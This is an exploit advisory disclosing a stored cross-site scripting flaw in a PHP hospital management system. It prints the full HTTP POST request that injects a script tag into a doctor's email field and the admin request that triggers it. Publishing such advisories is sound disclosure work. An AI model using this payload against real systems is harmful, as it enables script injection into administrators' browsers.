---
title: Hospital Management System 1.0 Cross Site Scripting
published: true
---

- Exploit Title: Hospital Management System - Stord XSS
- Google Dork: N/A
- Application: Hospital Management System
- Date: 27.02.2024
- Bugs: Stord XSS
- Exploit Author: SoSPiro
- Vendor Homepage: https://www.sourcecodester.com/
- Software Link: https://www.sourcecodester.com/php/16720/free-hospital-management-system-small-practices.html
- Version: 1.0
- Tested on: Windows 10 64 bit Wampserver
- CVE : N/A


### Vulnerability Description:
A security vulnerability has been identified in the "Vaidya Mitra" healthcare application, specifically in the doctor's account settings functionality. The issue arises due to inadequate input validation, allowing an attacker to inject malicious scripts into the system, leading to a Cross-Site Scripting (XSS) vulnerability.


### Proof of Concept (PoC):
1. Exploiting Doctor's Account Settings:

The attacker, using the Burp Suite Proxy tool, intercepts and modifies a POST request sent by the doctor to update their account settings.
The payload `<script>alert(1)</script>` is injected into the email parameter.
The manipulated request looks like the following:

```
POST /Vaidya%20Mitra/vm/doctor/edit-doc.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 170
...

id00=2&oldemail=doctor%40doctor.com&email=doctor%40doctor.com<script>alert(1123)</script>&name=Dr.Akash+Sanap&nic=234&Tele=8080808080&spec=1&password=doctor&cpassword=doctor
```

Upon submission, the payload gets stored in the doctor's email field.

2. Triggering XSS in Admin's View:

An admin viewing doctors' information at `http://localhost/Vaidya%20Mitra/vm/admin/doctors.php` inadvertently triggers the XSS vulnerability.
The admin sends a GET request to view a doctor's details:

```
GET /Vaidya%20Mitra/vm/admin/doctors.php?action=view&id=2 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
...
```

The server returns the doctor's information, and the XSS payload in the email field is executed in the admin's browser, leading to the alert being triggered.



[PoC - video](https://drive.google.com/file/d/1dCz5Q3mKMfpB2pjPeOV6ZoBi1Nj74DR1/view?usp=drive_link)